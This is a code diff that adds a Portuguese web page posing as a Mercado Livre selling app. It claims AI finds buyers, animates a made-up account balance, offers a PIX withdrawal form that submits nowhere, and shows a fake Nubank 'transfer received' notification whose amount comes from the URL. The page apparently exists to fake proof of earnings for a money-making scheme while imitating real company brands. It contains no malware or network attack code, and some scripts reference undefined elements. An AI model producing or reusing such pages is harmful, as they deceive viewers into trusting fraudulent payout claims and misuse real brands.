@@ -1,0 +1,370 @@
+<!DOCTYPE html>
+<html data-bs-theme="light" lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
+    <title>App ML</title>
+    <link rel="stylesheet" href="assets/bootstrap/css/bootstrap.min.css">
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lato:400,700,900&amp;display=swap">
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Poppins:400,500,600,700&amp;display=swap">
+    <link rel="stylesheet" href="assets/fonts/font-awesome.min.css">
+    <link rel="stylesheet" href="assets/css/styles.min.css">
+<script src="https://cdn.jsdelivr.net/npm/chart.js"> </script>
+</head>
+
+<body style="background: #EBEBEB;--bs-primary: #D3D3D3;--bs-primary-rgb: 211,211,211;--bs-warning: #D3D3D3;--bs-warning-rgb: 211,211,211;"><script>
+// Objeto que mapeia as opções da primeira seleção para as opções da segunda seleção
+const subcategorias = {
+  "1": ["Refrigerador Brastemp Frost Free Evox - Duplex 375 Litros", "Geladeira Electrolux Com Prateleira Reversível Platinum – 402L", "Geladeira Cycle Defrost Electrolux 240 Litros"],
+  "2": ["Fogão De Piso Itatiaia 4 Bocas Electra Glass", "Fogão De Piso Suggar 4 Bocas Com Mesa De Vidro Brancofgv410br", "Fogão Brastemp Piso 4 Bocas Duas Prateleiras Ajustáveis Inox", "Fogão De Piso Mesa De Vidro Electrolux 4 Bocas 52lpv", "Fogão De Piso Brastemp De 05 Bocas Com Turbo Chama E Touch Timer Inox"],
+  "3": ["iPhone 15 Pro Max", "Smartphone Samsung Galaxy S24 5G Preto 256GB", "Smartphone Motorola Edge 40 Neo"],
+  "4": ["Smart TV 60 LG 4K UHD 60UQ8050 WiFi", "Smart TV 65' 4K LG 65QNED80SRA Quantum Dot NanoCell 120Hz", "Smart TV 50' 4K LG NanoCell 50NANO77SRA Bluetooth", "Smart TV 43' AOC Full HD 43S5135/78G Roku TV", "Smart TV 50' UHD 4K Samsung 50CU7700"],
+  "5": ["Notebook Lenovo Core i3-1115G4", "Notebook Positivo Vision C15 Intel Celeron Dual Core", "Notebook Dell Inspiron 15 3000 Intel Core i5-1135G7", "Notebook ASUS Vivobook X1502ZA-EJ1764", "Notebook Gamer Acer NVIDIA GeForce GTX 1650 Core i5-11400H", "Notebook Galaxy Book3 360 Windows 11"]
+};
+
+const imagensCategorias = {
+  "1": "categorias/1.webp",
+  "2": "categorias/2.webp",
+  "3": "categorias/3.webp",
+  "4": "categorias/4.webp",
+  "5": "categorias/5.webp"
+};
+    
+function atualizarSubcategorias() {
+  // Obter o valor selecionado na primeira seleção
+  const categoriaSelecionada = document.getElementById("categoria").value;
+
+  // Obter as subcategorias correspondentes
+  const subcategoriasArray = subcategorias[categoriaSelecionada];
+
+  // Obter a segunda seleção
+  const subcategoriaSelect = document.getElementById("subcategoria");
+
+  // Limpar as opções existentes na segunda seleção
+  subcategoriaSelect.innerHTML = "";
+
+  // Adicionar as novas opções à segunda seleção
+  subcategoriasArray.forEach(function(subcategoria) {
+    const option = document.createElement("option");
+    option.value = subcategoria;
+    option.text = subcategoria;
+    subcategoriaSelect.add(option);
+  });
+
+  // Atualizar a imagem conforme a categoria selecionada
+  const urlImagem = imagensCategorias[categoriaSelecionada];
+  const imagemCategoria = document.querySelector('.imagemCategoria');
+  if (imagemCategoria) {
+    imagemCategoria.src = urlImagem;
+  }
+}
+</script>
+    <nav class="navbar navbar-expand-md sticky-top" style="background: #FFF159;color: rgb(0,0,0);">
+        <div class="container-fluid"><button class="navbar-toggler" data-bs-toggle="collapse" style="border-style: none;padding-left: 4px;"><span class="navbar-toggler-icon" style="font-size: 16px;"></span></button><a class="navbar-brand" style="border-style: none;padding-left: 4px;margin-right: 0px;padding-right: 4px;font-weight: bold;">
+                <div><img class="img-fluid" src="assets/img/Logotipo_MercadoLivre.png" width="104" height="26"></div>
+            </a></div>
+    </nav>
+    <div id="centro" style="background: #ffffff;text-align: center;width: 90%;padding-top: 28px;padding-right: 15px;padding-left: 15px;border-radius: 5px;padding-bottom: 38px;">
+        <h1 style="margin-bottom: 18px;">Escolha o Produto</h1>
+        <div style="width: auto;text-align: left;"><label class="form-label" style="text-align: left;">Selecione a categoria:</label><select id="categoria" style="padding-top: 5px;padding-bottom: 5px;padding-right: 12px;padding-left: 12px;border-radius: 5px;width: 100%;" onchange="atualizarSubcategorias()">
+                <option value="1">Geladeira</option>
+                <option value="2">Fogão</option>
+                <option value="3">Smartphones</option>
+                <option value="4">TVs</option>
+                <option value="5">Notebooks</option>
+            </select></div>
+        <div style="width: auto;text-align: left;margin-top: 18px;"><label class="form-label" style="text-align: left;">Selecione o produto:</label><select id="subcategoria" style="padding-top: 5px;padding-bottom: 5px;padding-right: 12px;padding-left: 12px;border-radius: 5px;width: 100%;"></select></div><img class="img-fluid imagemCategoria" id="imagemCategoria" loading="auto" style="margin-top: 32px;" src="assets/img/categorias.gif">
+        <div style="margin-top: 12px;"><button class="btn btn-primary" type="button" style="border-radius: 3px;width: 70%;font-family: Lato, sans-serif;border-style: none;" data-bs-target="#modal-comprador" data-bs-toggle="modal"><i class="fa fa-power-off" style="margin-right: 6px;font-size: 13px;"></i>Procurar Comprador</button></div>
+    </div>
+    <div class="text-center fixed-bottom" id="bottom">
+        <div style="background: #ffffff;padding-bottom: 10px;padding-top: 10px;"><a href="index.html" style="color: rgb(0,0,0);"><svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" fill="currentColor" viewBox="0 0 16 16" class="bi bi-house-fill" style="font-size: 24px;">
+                    <path d="M8.707 1.5a1 1 0 0 0-1.414 0L.646 8.146a.5.5 0 0 0 .708.708L8 2.207l6.646 6.647a.5.5 0 0 0 .708-.708L13 5.793V2.5a.5.5 0 0 0-.5-.5h-1a.5.5 0 0 0-.5.5v1.293z"></path>
+                    <path d="m8 3.293 6 6V13.5a1.5 1.5 0 0 1-1.5 1.5h-9A1.5 1.5 0 0 1 2 13.5V9.293l6-6Z"></path>
+                </svg></a><svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" fill="currentColor" viewBox="0 0 16 16" class="bi bi-search" style="font-size: 24px;margin-left: 32px;">
+                <path d="M11.742 10.344a6.5 6.5 0 1 0-1.397 1.398h-.001c.03.04.062.078.098.115l3.85 3.85a1 1 0 0 0 1.415-1.414l-3.85-3.85a1.007 1.007 0 0 0-.115-.1zM12 6.5a5.5 5.5 0 1 1-11 0 5.5 5.5 0 0 1 11 0"></path>
+            </svg><a href="#" data-bs-target="#modal-carregando" data-bs-toggle="modal"><svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" fill="currentColor" viewBox="0 0 16 16" class="bi bi-plus-lg" style="background: rgba(30,96,222,0.88);color: rgb(255,255,255);border-radius: 16px;font-size: 48px;margin-right: 40px;margin-left: 40px;padding: 4px;">
+                    <path fill-rule="evenodd" d="M8 2a.5.5 0 0 1 .5.5v5h5a.5.5 0 0 1 0 1h-5v5a.5.5 0 0 1-1 0v-5h-5a.5.5 0 0 1 0-1h5v-5A.5.5 0 0 1 8 2"></path>
+                </svg></a><a href="#" data-bs-target="#toast-1" data-bs-toggle="toast"><svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" fill="currentColor" viewBox="0 0 16 16" class="bi bi-bell" style="font-size: 24px;margin-right: 32px;color: rgb(33,37,41);">
+                    <path d="M8 16a2 2 0 0 0 2-2H6a2 2 0 0 0 2 2M8 1.918l-.797.161A4.002 4.002 0 0 0 4 6c0 .628-.134 2.197-.459 3.742-.16.767-.376 1.566-.663 2.258h10.244c-.287-.692-.502-1.49-.663-2.258C12.134 8.197 12 6.628 12 6a4.002 4.002 0 0 0-3.203-3.92L8 1.917zM14.22 12c.223.447.481.801.78 1H1c.299-.199.557-.553.78-1C2.68 10.2 3 6.88 3 6c0-2.42 1.72-4.44 4.005-4.901a1 1 0 1 1 1.99 0A5.002 5.002 0 0 1 13 6c0 .88.32 4.2 1.22 6"></path>
+                </svg></a><a href="#" style="color: rgb(33,37,41);" data-bs-target="#modal-financeiro" data-bs-toggle="modal"><svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" fill="currentColor" viewBox="0 0 16 16" class="bi bi-wallet2" style="font-size: 24px;">
+                    <path d="M12.136.326A1.5 1.5 0 0 1 14 1.78V3h.5A1.5 1.5 0 0 1 16 4.5v9a1.5 1.5 0 0 1-1.5 1.5h-13A1.5 1.5 0 0 1 0 13.5v-9a1.5 1.5 0 0 1 1.432-1.499L12.136.326zM5.562 3H13V1.78a.5.5 0 0 0-.621-.484zM1.5 4a.5.5 0 0 0-.5.5v9a.5.5 0 0 0 .5.5h13a.5.5 0 0 0 .5-.5v-9a.5.5 0 0 0-.5-.5z"></path>
+                </svg></a></div>
+    </div>
+    <div class="modal fade" role="dialog" tabindex="-1" id="modal-comprador">
+        <div class="modal-dialog" role="document">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <h4 class="modal-title">Buscando comprador</h4><button class="btn-close" type="button" aria-label="Close" data-bs-dismiss="modal"></button>
+                </div>
+                <div class="modal-body">
+                    <div class="d-flex justify-content-center"><img src="assets/img/logocash%20(4)%20(1).gif"></div>
+                    <div class="d-flex justify-content-center" style="margin-top: 28px;">
+                        <p style="text-align: center;">Aguarde, estamos usando <strong>Inteligência Artificial</strong> para buscar um comprador para seu produto.</p>
+                    </div>
+                </div>
+                <div class="modal-footer"><button class="btn btn-light" type="button" data-bs-dismiss="modal">Cancelar</button></div><script>
+const modal = document.getElementById("modal-comprador");
+
+modal.addEventListener("shown.bs.modal", () => {
+  const valor = obterValor(document.querySelector('.dinheirotopo'));
+
+  setTimeout(() => {
+    const urlComParametro = `final.html?dinheiro=${valor}`;
+    window.location.href = urlComParametro;
+  }, 8000);
+});
+
+// Função para obter o valor do elemento
+function obterValor(obj) {
+  return obj.textContent.replace('R$ ', '').replace(',', '.');
+}
+</script>
+            </div>
+        </div>
+    </div>
+    <div class="modal fade" role="dialog" tabindex="-1" id="modal-financeiro">
+        <div class="modal-dialog" role="document">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <h4 class="modal-title">Financeiro</h4><button class="btn-close" type="button" aria-label="Close" data-bs-dismiss="modal"></button>
+                </div>
+                <div class="modal-body" style="text-align: center;">
+                    <div class="card" style="text-align: left;">
+                        <div class="card-body">
+                            <div class="row d-flex align-items-center">
+                                <div class="col-3" style="text-align: center;"><svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" fill="currentColor" viewBox="0 0 16 16" class="bi bi-currency-dollar" style="font-size: 41px;">
+                                        <path d="M4 10.781c.148 1.667 1.513 2.85 3.591 3.003V15h1.043v-1.216c2.27-.179 3.678-1.438 3.678-3.3 0-1.59-.947-2.51-2.956-3.028l-.722-.187V3.467c1.122.11 1.879.714 2.07 1.616h1.47c-.166-1.6-1.54-2.748-3.54-2.875V1H7.591v1.233c-1.939.23-3.27 1.472-3.27 3.156 0 1.454.966 2.483 2.661 2.917l.61.162v4.031c-1.149-.17-1.94-.8-2.131-1.718H4zm3.391-3.836c-1.043-.263-1.6-.825-1.6-1.616 0-.944.704-1.641 1.8-1.828v3.495l-.2-.05zm1.591 1.872c1.287.323 1.852.859 1.852 1.769 0 1.097-.826 1.828-2.2 1.939V8.73l.348.086z"></path>
+                                    </svg></div>
+                                <div class="col">
+                                    <p class="text-start" style="margin-bottom: 2px;">Saldo Disponível</p>
+                                    <p class="text-start dinheirotopo" style="font-size: 24px;font-weight: bold;margin-bottom: 8px;">R$ 0,00</p>
+                                </div>
+                            </div>
+                        </div>
+                    </div><button class="btn btn-primary botao-solicitar-saque" type="button" style="font-size: 16px;border-radius: 3px;font-family: Lato, sans-serif;border-style: none;width: 98%;margin-top: 18px;" data-bs-dismiss="modal" data-bs-target="#modal-2" data-bs-toggle="modal">Efetuar saque</button>
+                    <div><button class="btn btn-primary" type="button" style="font-size: 16px;border-radius: 3px;font-family: Lato, sans-serif;background: rgb(136,136,136);border-style: none;width: 98%;margin-top: 8px;">Ver relatório</button></div>
+                </div>
+                <div class="modal-footer"></div>
+            </div>
+        </div>
+    </div>
+    <div id="aparecernoticacao">
+        <div id="notification-wrapper" class="notification-wrapper">
+            <div class="notification"><img src="assets/img/nubank.webp" class="notification-image">
+                <div class="notification-text"><span class="notification-title">Transferência recebida</span><span class="notification-description transferencia">Você recebeu uma transferência de R$2407,02 de App Al-Hilal LTDA</span><script>
+    document.addEventListener('DOMContentLoaded', function() {
+  // Função para obter o valor do parâmetro 'dinheiro' da URL
+  function obterValorDinheiroDaURL() {
+    const params = new URLSearchParams(window.location.search);
+    const valorDinheiro = params.get('dinheiro');
+    return valorDinheiro ? valorDinheiro : '0'; // Retorna '0' se não houver valor
+  }
+
+  // Seleciona o span onde o valor deve ser replicado
+  var spanTransferencia = document.querySelector('span.transferencia');
+
+  // Função para atualizar o span com o valor do parâmetro 'dinheiro'
+  function atualizarSpanTransferencia() {
+    // Pega o valor de 'dinheiro' da URL
+    var valorDinheiro = obterValorDinheiroDaURL();
+
+    // Atualiza o span com o novo valor
+    spanTransferencia.textContent = 'Você recebeu uma transferência de R$' + valorDinheiro + ' de Vendedor Anônimo LTDA';
+  }
+
+  // Chama a função para atualizar o span assim que a página carrega
+  atualizarSpanTransferencia();
+});
+</script></div>
+            </div>
+        </div><script>
+  botaoSacar.addEventListener("click", function() {
+    setTimeout(function(){
+      notificationWrapper.style.display = "block";
+    }, 4000); 
+  });
+    
+</script>
+        <div class="modal-saque">
+            <div class="modal-conteudo">
+                <h3 class="h1solicitarsaque" style="font-size: 21.272px;">SOLICITAR SAQUE</h3>
+                <form class="formdopix"><label class="form-label form-label" for="chave-pix">Digite sua chave PIX:</label>
+                    <div><input type="text" id="chave-pix" name="chave-pix" placeholder="Digite seu pix aqui..."></div><button type="button" style="font-size:20px;border-radius:6px;background:#007474;border-style:none;font-weight:bold;padding-top:6px;padding-bottom:6px;padding-right:42px;padding-left:42px;margin-top:4px;color:rgb(255,255,255);" id="botao-sacar">SACAR</button>
+                    <p style="font-size:13px;margin-top:8px;font-style:italic;">Você só pode sacar o valor total</p>
+                </form><span class="close-button" style="border-radius:152px;"><svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewbox="0 0 24 24" fill="none" style="color:#007474;"><path d="M16.3394 9.32245C16.7434 8.94589 16.7657 8.31312 16.3891 7.90911C16.0126 7.50509 15.3798 7.48283 14.9758 7.85938L12.0497 10.5866L9.32245 7.66048C8.94589 7.25647 8.31312 7.23421 7.90911 7.61076C7.50509 7.98731 7.48283 8.62008 7.85938 9.0241L10.5866 11.9502L7.66048 14.6775C7.25647 15.054 7.23421 15.6868 7.61076 16.0908C7.98731 16.4948 8.62008 16.5171 9.0241 16.1405L11.9502 13.4133L14.6775 16.3394C15.054 16.7434 15.6868 16.7657 16.0908 16.3891C16.4948 16.0126 16.5171 15.3798 16.1405 14.9758L13.4133 12.0497L16.3394 9.32245Z" fill="currentColor"></path><path fill-rule="evenodd" d="M1 12C1 5.92487 5.92487 1 12 1C18.0751 1 23 5.92487 23 12C23 18.0751 18.0751 23 12 23C5.92487 23 1 18.0751 1 12ZM12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3C16.9706 3 21 7.02944 21 12C21 16.9706 16.9706 21 12 21Z" fill="currentColor"></path></svg></span>
+            </div><script>
+    // Função para fechar o modal
+function closeModal() {
+  document.querySelector('.modal-saque').style.display = 'none';
+}
+
+// Adiciona ouvinte de eventos ao botão de fechar
+document.querySelector('.close-button').addEventListener('click', closeModal);
+
+// Adiciona ouvinte de eventos ao fundo do modal (fora do form)
+document.addEventListener('click', function(event) {
+  var modal = document.querySelector('.modal-saque');
+
+  // Fecha o modal se clicar fora do form
+  if (!form.contains(event.target)) {
+    closeModal();
+  }
+});
+
+// Impede que eventos de clique no form fechem o modal
+document.querySelector('.formdopix').addEventListener('click', function(event) {
+  event.stopPropagation();
+});
+</script>
+        </div><script>
+const botaoSolicitarSaque = document.querySelector(".botao-solicitar-saque");
+const modalSaque = document.querySelector(".modal-saque");
+const botaoSacar = document.getElementById("botao-sacar");
+const notificationWrapper = document.querySelector(".notification-wrapper");
+
+botaoSolicitarSaque.addEventListener("click", (event) => {
+  event.preventDefault(); // evita redirecionar a página
+  modalSaque.style.display = "flex";
+});
+
+botaoSacar.addEventListener("click", (event) => {
+  event.preventDefault(); // evita redirecionar a página
+  const chavePix = document.getElementById("chave-pix").value;
+  console.log(`Solicitando saque com a chave PIX ${chavePix}`);
+  // aqui você pode fazer alguma ação, como enviar os dados para o servidor
+  modalSaque.style.display = "none";
+  
+  // Mostra a notificação após 4 segundos
+  setTimeout(function(){
+    notificationWrapper.style.display = "block";
+    
+    // Esconde a notificação após 8 segundos
+    setTimeout(function(){
+      notificationWrapper.style.display = "none";
+    }, 6000);
+  }, 4000);
+});
+    
+function mudarValor() {
+  setTimeout(function() {
+    document.getElementById("saldo-texto").innerHTML = "R$ 0,00";
+  }, 4000);
+}
+</script><script>
+document.addEventListener("DOMContentLoaded", function() {
+  // Seleciona o botão pelo ID
+  var botaoSacar = document.getElementById('botao-sacar');
+
+  // Adiciona um ouvinte de eventos para o clique do botão
+  botaoSacar.addEventListener('click', function() {
+    // Aguarda 3 segundos (3000 milissegundos) antes de executar a função
+    setTimeout(function() {
+      // Seleciona o parágrafo pelo ID
+      var saldoAumentarParagrafo = document.getElementById('saldo-aumentar');
+      // Atualiza o texto do parágrafo
+      saldoAumentarParagrafo.textContent = 'R$ 0.00';
+    }, 3000); // 3 segundos de atraso
+  });
+});
+</script><style>
+    @keyframes slideOut {
+        from {
+            transform: translateX(0);
+        }
+        to {
+            transform: translateX(-100%);
+        }
+    }
+
+    @keyframes fadeIn {
+        from {
+            opacity: 0;
+        }
+        to {
+            opacity: 1;
+        }
+    }
+
+    body {
+        animation: fadeIn 1s ease-out;
+    }
+
+    #notification-wrapper {
+        cursor: pointer;
+    }
+</style>
+
+<script>
+document.addEventListener("DOMContentLoaded", function() {
+    var notificationWrapper = document.getElementById('notification-wrapper');
+    if (notificationWrapper) {
+        notificationWrapper.addEventListener('click', function() {
+            // Adiciona a animação ao body
+            document.body.style.animation = "slideOut 0.5s ease-out forwards";
+
+            // Espera a animação terminar para redirecionar
+            setTimeout(function() {
+                // Obtem o valor do parâmetro 'dinheiro' da URL atual
+                const params = new URLSearchParams(window.location.search);
+                const valorDinheiro = params.get('dinheiro'); // 'dinheiro' é o nome do parâmetro
+
+                // Verifica se o valor de 'dinheiro' existe antes de redirecionar
+                if(valorDinheiro !== null) {
+                    window.location.href = "nubank.html?dinheiro=" + valorDinheiro;
+                } else {
+                    // Caso o parâmetro 'dinheiro' não esteja presente na URL, redireciona sem o parâmetro
+                    // ou pode redirecionar para uma URL/página de erro, conforme preferir
+                    window.location.href = "nubank.html";
+                }
+            }, 500); // Ajuste este tempo de acordo com a duração da sua animação
+        });
+    }
+});
+</script>
+    </div><script>
+    // Função para obter o valor do parâmetro da URL
+function obterValorParametro() {
+  const urlParams = new URLSearchParams(window.location.search);
+  const valorParametro = urlParams.get('dinheiro');
+  return valorParametro ? valorParametro.replace(',', '.') : '';
+}
+
+// Função para animar o valor do elemento
+function animateValue(obj, start, end, duration) {
+  let startTimestamp = null;
+  const step = (timestamp) => {
+    if (!startTimestamp) startTimestamp = timestamp;
+    const progress = Math.min((timestamp - startTimestamp) / duration, 1);
+    const valorAtual = start + progress * (end - start);
+    obj.innerHTML = `R$ ${valorAtual.toFixed(2).replace('.', ',')}`;
+    if (progress < 1) {
+      window.requestAnimationFrame(step);
+    }
+  };
+  window.requestAnimationFrame(step);
+
+  // Limita o número de caracteres durante a animação
+  const updateText = () => {
+    const valorAtual = obj.textContent.replace('R$ ', '');
+    if (valorAtual.length > 7) {
+      obj.textContent = `R$ ${valorAtual.substring(0, 7)}`;
+    }
+  };
+  setInterval(updateText, 100); // Atualiza o texto a cada 100ms
+}
+
+// Obtém o valor do parâmetro
+const valorParametro = obterValorParametro();
+
+// Se o valor do parâmetro existir, anima o valor do elemento
+if (valorParametro) {
+  const valorNumerico = parseFloat(valorParametro);
+  animateValue(document.querySelector('.dinheirotopo'), 0, valorNumerico, 2000);
+}
+</script>
+    <script src="assets/bootstrap/js/bootstrap.min.js"></script>
+    <script src="assets/js/script.min.js"></script>
+</body>
+
+</html>
